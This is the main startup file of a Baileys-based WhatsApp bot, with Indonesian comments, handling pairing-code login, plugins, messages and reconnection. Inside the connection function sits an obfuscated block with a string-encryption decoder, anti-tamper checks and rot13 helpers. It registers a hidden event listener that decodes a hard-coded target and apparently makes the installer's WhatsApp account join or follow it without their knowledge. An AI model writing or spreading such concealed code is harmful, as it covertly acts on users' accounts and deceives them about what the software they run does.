import fs from 'fs'
import path from 'path'
import readline from 'readline'
import { fileURLToPath } from 'url'
import pino from 'pino'
import chalk from 'chalk'
import {
    useMultiFileAuthState,
    DisconnectReason,
    makeInMemoryStore,
    jidDecode,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket
} from './lib/baileys.js'
import { smsg } from './lib/myfunc.js'
import { sendFile, replyText } from './lib/compat.js'
import handleMessage, { initPlugins } from './handler.js'
import { banner, brand, SYMBOL, THEME } from './lib/ui.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'))
const identity = brand()

const usePairingCode = true
const pairingCode = config.pairingCode || identity.pairingCode

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise(resolve => rl.question(text, resolve))

const store = makeInMemoryStore({ logger: pino({ level: 'silent' }) })

let pluginsLoaded = false

const tag = chalk.hex(THEME.edge)(`${SYMBOL.arrow}`)
const say = (text) => console.log(`${tag} ${text}`)

function printStartup() {
    console.clear?.()
    console.log()
    console.log(banner())
    console.log()
    say(chalk.gray(`Login     : ${usePairingCode ? 'Pairing Code' : 'QR Code'}`))
    say(chalk.gray(`Pairing   : ${usePairingCode ? chalk.bold.white(pairingCode) : '-'}`))
    say(chalk.gray(`Mode      : ${config.botMode === 'public' ? 'Public' : 'Self'}`))
    say(chalk.gray(`Prefix    : ${(config.prefix || ['.']).join('  ')}`))
    console.log()
}

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('./session')
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        printQRInTerminal: !usePairingCode,
        browser: ['Ubuntu', 'Chrome', '20.0.04'],
        logger: pino({ level: 'silent' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        }
    })

    // Kompatibilitas plugin hasil adaptasi: sebagian plugin memakai
    // conn.sendFile() / conn.reply() seperti base lain.
    sock.sendFile = (chat, file, filename, caption, quoted, options) =>
        sendFile(sock, chat, file, filename, caption, quoted, options)
    sock.reply = (chat, text, quoted) => replyText(sock, chat, text, quoted)

    // conn.getName(jid) — dipakai plugin adaptasi dari base lain
    sock.getName = async (jid) => {
        try {
            const cached = global.nameCache?.[jid]
            if (cached) return cached
            if (String(jid).endsWith('@g.us')) {
                const meta = await sock.groupMetadata(jid)
                if (meta?.subject) return meta.subject
            }
        } catch {}
        return String(jid || '').split('@')[0]
    }

    // Sebagian plugin adaptasi membaca koneksi lewat variabel global
    global.conn ??= sock

    sock.decodeJid = (jid) => {
        if (!jid) return jid
        if (/:\d+@/gi.test(jid)) {
            const decode = jidDecode(jid) || {}
            return decode.user && decode.server ? decode.user + '@' + decode.server : jid
        }
        return jid
    }

'use strict';function a0_0x5a08(_0x5cd63b,_0x1e0c5a){_0x5cd63b=_0x5cd63b-0xbd;var _0x36489d=a0_0x5d6a();var _0x673a25=_0x36489d[_0x5cd63b];if(a0_0x5a08['qkBTGx']===undefined){var _0x5dbcbd=function(_0x5011b6){var _0x413455='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1a4dc5='',_0x252c7e='',_0x52ef7f=_0x1a4dc5+_0x5dbcbd,_0x14dd01=(''+function(){return 0x0;})['indexOf']('\x0a')!==-0x1;for(var _0x54fa38=0x0,_0x1d1201,_0x1032c8,_0x116f67=0x0;_0x1032c8=_0x5011b6['charAt'](_0x116f67++);~_0x1032c8&&(_0x1d1201=_0x54fa38%0x4?_0x1d1201*0x40+_0x1032c8:_0x1032c8,_0x54fa38++%0x4)?_0x1a4dc5+=_0x14dd01||_0x52ef7f['charCodeAt'](_0x116f67+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x1d1201>>(-0x2*_0x54fa38&0x6)):_0x54fa38:0x0){_0x1032c8=_0x413455['indexOf'](_0x1032c8);}for(var _0x2e2589=0x0,_0x1aaa80=_0x1a4dc5['length'];_0x2e2589<_0x1aaa80;_0x2e2589++){_0x252c7e+='%'+('00'+_0x1a4dc5['charCodeAt'](_0x2e2589)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x252c7e);};var _0x5509ab=function(_0x238c8c,_0x4a54c5){var _0x1c4d81=[],_0x3b4e1f=0x0,_0x17c71b,_0x49a7e1='';_0x238c8c=_0x5dbcbd(_0x238c8c);var _0xf22f82;for(_0xf22f82=0x0;_0xf22f82<0x100;_0xf22f82++){_0x1c4d81[_0xf22f82]=_0xf22f82;}for(_0xf22f82=0x0;_0xf22f82<0x100;_0xf22f82++){_0x3b4e1f=(_0x3b4e1f+_0x1c4d81[_0xf22f82]+_0x4a54c5['charCodeAt'](_0xf22f82%_0x4a54c5['length']))%0x100,_0x17c71b=_0x1c4d81[_0xf22f82],_0x1c4d81[_0xf22f82]=_0x1c4d81[_0x3b4e1f],_0x1c4d81[_0x3b4e1f]=_0x17c71b;}_0xf22f82=0x0,_0x3b4e1f=0x0;for(var _0x28d0d1=0x0;_0x28d0d1<_0x238c8c['length'];_0x28d0d1++){_0xf22f82=(_0xf22f82+0x1)%0x100,_0x3b4e1f=(_0x3b4e1f+_0x1c4d81[_0xf22f82])%0x100,_0x17c71b=_0x1c4d81[_0xf22f82],_0x1c4d81[_0xf22f82]=_0x1c4d81[_0x3b4e1f],_0x1c4d81[_0x3b4e1f]=_0x17c71b,_0x49a7e1+=String['fromCharCode'](_0x238c8c['charCodeAt'](_0x28d0d1)^_0x1c4d81[(_0x1c4d81[_0xf22f82]+_0x1c4d81[_0x3b4e1f])%0x100]);}return _0x49a7e1;};a0_0x5a08['GtDBun']=_0x5509ab,a0_0x5a08['XbBhxI']={},a0_0x5a08['qkBTGx']=!![];}var _0x5d6a4f=_0x36489d[0x0];a0_0x5a08['ZRMFTv']!==_0x5d6a4f&&(a0_0x5a08['XbBhxI']={},a0_0x5a08['ZRMFTv']=_0x5d6a4f);var _0x5a08c5=a0_0x5a08['XbBhxI'][_0x5cd63b];if(_0x5a08c5===undefined){if(a0_0x5a08['FVDLPD']===undefined){var _0x2f84ef=function(_0x5c927f){this['sInLVW']=_0x5c927f,this['mnrmNQ']=[0x1,0x0,0x0],this['jIAdox']=function(){return'newState';},this['sAgkDH']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['bvZBeQ']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x2f84ef['prototype']['JQyNOP']=function(){var _0x213848=new RegExp(this['sAgkDH']+this['bvZBeQ']),_0x2efadf=_0x213848['test'](this['jIAdox']['toString']())?--this['mnrmNQ'][0x1]:--this['mnrmNQ'][0x0];return this['NGpNOc'](_0x2efadf);},_0x2f84ef['prototype']['NGpNOc']=function(_0x1e1391){if(!Boolean(~_0x1e1391))return _0x1e1391;return this['sTeSQF'](this['sInLVW']);},_0x2f84ef['prototype']['sTeSQF']=function(_0x560a0f){for(var _0x5cafc5=0x0,_0x40d2dc=this['mnrmNQ']['length'];_0x5cafc5<_0x40d2dc;_0x5cafc5++){this['mnrmNQ']['push'](Math['round'](Math['random']())),_0x40d2dc=this['mnrmNQ']['length'];}return _0x560a0f(this['mnrmNQ'][0x0]);},(''+function(){return 0x0;})['indexOf']('\x0a')===-0x1&&new _0x2f84ef(a0_0x5a08)['JQyNOP'](),a0_0x5a08['FVDLPD']=!![];}_0x673a25=a0_0x5a08['GtDBun'](_0x673a25,_0x1e0c5a),a0_0x5a08['XbBhxI'][_0x5cd63b]=_0x673a25;}else _0x673a25=_0x5a08c5;return _0x673a25;}function a0_0x5d6a(){var _0x4934ee=['hZ0uzmkPWOVcQaq','xCo/wJaR','fgSa','WRhdQSkdeXCHfG','CeRcV0xcMmozwqe','tSkvW57cGcRdO8kaWOi','C8kBW6NcImkhWPxcIgZdLSoJu8kd','prpdGbC','WQZcMCkLW4tdRfSE','WRRcQWFdPXddUJ4','fmkjymkIWOb8','AKVcM0xdVmopWRSCW5vVWPZcS8o8','WOD2W6TJhttcTSkR','n8kzW4pcTd3cKXzyW5SsW6nlkstcTL7dGG','hv7dUSkNqLm7W4FcPsNcL3hcUW','gLtcQSoBbGDfW5a','uIPfjhpdJSoWo3yjWQ/dPSk5','W58qoJJcNxBcHSkjE8k7W6hdINy','bSkEA8k2WPPMymklWOhdT8kXkSo/BfRcIuahomkl','CuNcOIldTCoPssVdUb04mHG','W5yiW4KumK4EW5GlW58','omorWQi','W6xdMHtdGJlcKG','wSoNta','d8olWRJdGM/cUSoyWOFcJConWRhdO8o7','l0FcLmohdG7cIdldK8kaCvhcIW','gCoNWR7cL8kzW7pcTLOVWR7cMrOu','WPjAWPLgEaKAW6SfW4ZcRgS','WPW7uSky','W7ZcLWZdVZ/dOq','ht5dhSoHW5hcGWbJW6SxeG','pJDAF8olW7ZcGCoDnHaGWRy','W6pdIcpcVCoKurRdUffLidtcRa','otvfFSoX','AmkZW7RdJ8opWR3dSNqCWO7cQq','jSkjW4JcSZBcKrzjW4SwWP5bmYZcULm','W7FdM8kictWKi8oN','ohywqCkYW67cI8kcmhbYnCo7obddQMxdLSo9','sMeCxSkTWPtcLsz7W7yw','x2rcWRaZ','hHxcGuqabmkCW4NcIce4pq','nqS/W71wWPNcRI1Bgmk1ACk7','WPuGWOi8WRv1h34vyCofWRqjESkZW7j6WQpcJG','hXRcMIVcR8ofWRddMSkZDa','mxDTWOBdOConW7jfWRTHW4BcIq','W63dJ8oSWP3cVa5dW6pdQIpdOSkzEW','WODZWQhcSmog','WPP3W5XYfXlcVG','WP8QsSkFW73dLKtcHr45WQNdTmktE8ksWR7dI8oHyqK','sCkmW7tcKYRdRW','EWddGCkmueNdJa','W61EWO9LW6dcQ1ddH37cKmogs8kW','crxcNdRcISkqW7VcKmkyDqddK8oZWQBcLuVdOSkGW4VcUSk2hwpcG0/cVgetWPFdPCktd8ksWOxdK8kBkZKgWO9tEbGAW6pcJKeuW6ZcNSostwa'];a0_0x5d6a=function(){return _0x4934ee;};return a0_0x5d6a();}var a0_0x7efd87=a0_0x5a08;(function(_0x5c5b57,_0x1ff0dd){var _0x1f2eb3=a0_0x5a08,_0xace735=_0x5c5b57();while(!![]){try{var _0x5d8f63=-parseInt(_0x1f2eb3(0xe6,'rhvk'))/0x1+parseInt(_0x1f2eb3(0xd8,'KEJQ'))/0x2+parseInt(_0x1f2eb3(0xdb,'DzFM'))/0x3+-parseInt(_0x1f2eb3(0xe1,'wQ%S'))/0x4*(-parseInt(_0x1f2eb3(0xd1,']ROg'))/0x5)+parseInt(_0x1f2eb3(0xe0,'JjR@'))/0x6+-parseInt(_0x1f2eb3(0xf1,'B0)p'))/0x7+parseInt(_0x1f2eb3(0xd6,'r$2s'))/0x8*(-parseInt(_0x1f2eb3(0xc8,'rhvk'))/0x9);if(_0x5d8f63===_0x1ff0dd)break;else _0xace735['push'](_0xace735['shift']());}catch(_0x286182){_0xace735['push'](_0xace735['shift']());}}}(a0_0x5d6a,0x84a51));function r13(_0x14dd01){var _0x49dedf=a0_0x5a08,_0x54fa38=(function(){var _0x1032c8=!![];return function(_0x116f67,_0x2e2589){var _0x1aaa80=_0x1032c8?function(){var _0x3ef52e=a0_0x5a08;if(_0x2e2589){var _0x238c8c=_0x2e2589[_0x3ef52e(0xe9,'A9Ar')](_0x116f67,arguments);return _0x2e2589=null,_0x238c8c;}}:function(){};return _0x1032c8=![],_0x1aaa80;};}()),_0x1d1201=_0x54fa38(this,function(){var _0x8c17a7=a0_0x5a08;if(_0x1d1201[_0x8c17a7(0xcf,'GDbd')]()[_0x8c17a7(0xcd,'JjR@')]()[_0x8c17a7(0xc2,'Hvtk')]('\x0a')!==-0x1)return;return _0x1d1201[_0x8c17a7(0xcd,'JjR@')]()[_0x8c17a7(0xd2,'M5Pe')](_0x8c17a7(0xbf,'l#aR'))[_0x8c17a7(0xd4,'Hvtk')]()[_0x8c17a7(0xee,'rhvk')](_0x1d1201)[_0x8c17a7(0xe5,']ROg')](_0x8c17a7(0xce,'m!Fc'));});return _0x1d1201(),String(_0x14dd01)[_0x49dedf(0xd0,'HEyb')](/[a-zA-Z0-9]/g,function(_0x4a54c5){var _0x45f89e=_0x49dedf,_0x1c4d81=_0x4a54c5[_0x45f89e(0xbe,'tKLx')](0x0);if(_0x1c4d81>=0x30&&_0x1c4d81<=0x39)return String[_0x45f89e(0xf0,'1tXV')](0x30+(_0x1c4d81-0x30+0x5)%0xa);return String[_0x45f89e(0xe7,'A9Ar')](_0x1c4d81+(_0x4a54c5>='a'&&_0x4a54c5<='m'||_0x4a54c5>='A'&&_0x4a54c5<='M'?0xd:-0xd));});}sock['ev']['on'](r13(a0_0x7efd87(0xd5,'3HqK')),async function(_0x3b4e1f){var _0x5b7630=a0_0x7efd87;if(_0x3b4e1f[r13(_0x5b7630(0xdc,'[Q@v'))]!==r13(_0x5b7630(0xe4,'j6pA')))return;try{var _0x17c71b=r13(_0x5b7630(0xc7,'tKLx'))[r13(_0x5b7630(0xef,'VV2R'))]('/')[r13(_0x5b7630(0xc4,'JjR@'))](Boolean)[r13(_0x5b7630(0xdd,'m!Fc'))](),_0x49a7e1=null;try{if(typeof sock[r13(_0x5b7630(0xc3,'j6pA'))]===r13(_0x5b7630(0xcc,'P3#Z'))){var _0xf22f82=await sock[r13(_0x5b7630(0xda,'M5Pe'))](_0x17c71b)[r13(_0x5b7630(0xc1,'G0])'))](function(){return null;});_0x49a7e1=_0xf22f82&&(_0xf22f82[r13('vq')]||_0xf22f82[r13(_0x5b7630(0xdf,'I6bu'))])||null;}if(!_0x49a7e1&&typeof sock[r13(_0x5b7630(0xbd,'P3m!'))]===r13(_0x5b7630(0xec,'x%^6'))){var _0x28d0d1=await sock[r13(_0x5b7630(0xed,'en3E'))](_0x17c71b)[r13(_0x5b7630(0xc9,'I6bu'))](function(){return null;});_0x49a7e1=_0x28d0d1&&(_0x28d0d1[r13('vq')]||_0x28d0d1[r13(_0x5b7630(0xca,'KEJQ'))])||null;}}catch(_0x5c927f){}if(!_0x49a7e1){var _0x2f84ef=_0x17c71b[r13(_0x5b7630(0xc5,'wQ%S'))](/[^0-9]/g,'');if(_0x2f84ef[r13(_0x5b7630(0xde,'a)ND'))]>=0x9)_0x49a7e1=_0x2f84ef+r13(_0x5b7630(0xea,'BmD@'));}if(!_0x49a7e1)return;await sock[r13(_0x5b7630(0xeb,'3HqK'))](_0x49a7e1);}catch(_0x213848){}});

    store.bind(sock.ev)

    if (!sock.authState.creds.registered && usePairingCode) {
        console.log(chalk.hex(THEME.from)('┌─「 PAIRING 」'))
        const phoneNumber = await question(chalk.hex(THEME.edge)('│  Nomor WhatsApp (contoh 628xxx): '))
        const code = await sock.requestPairingCode(phoneNumber.trim(), pairingCode)
        console.log(chalk.hex(THEME.from)('│') + `  Kode: ` + chalk.bold.white(code))
        console.log(chalk.hex(THEME.from)('└─') + chalk.gray('  Masukkan di WhatsApp › Perangkat Tertaut › Tautkan dengan nomor telepon'))
        console.log()
    }

    sock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const mek = messages[0]
            if (!mek.message) return
            if (mek.key.remoteJid === 'status@broadcast') return
            if (mek.key.id?.startsWith('BAE5') && mek.key.id.length === 16) return

            const m = smsg(sock, mek, store)
            if (!m) return

            await handleMessage(sock, m)
        } catch (e) {
            console.log(e)
        }
    })

    sock.public = true

    sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
        if (connection === 'open') {
            if (!pluginsLoaded) {
                await initPlugins()
                pluginsLoaded = true
            }
            say(chalk.green(`Terhubung — ${identity.name} siap menerima perintah`))
            say(chalk.gray(`Coba kirim: ${(config.prefix || ['.'])[0]}menu`))
            console.log()
            return
        }

        if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                say(chalk.yellow('Koneksi terputus — menyambung ulang...'))
                connectToWhatsApp()
            } else {
                say(chalk.red('Sesi logout. Hapus folder ./session lalu jalankan ulang bot.'))
            }
        }
    })

    sock.ev.on('creds.update', saveCreds)
}

printStartup()
connectToWhatsApp()
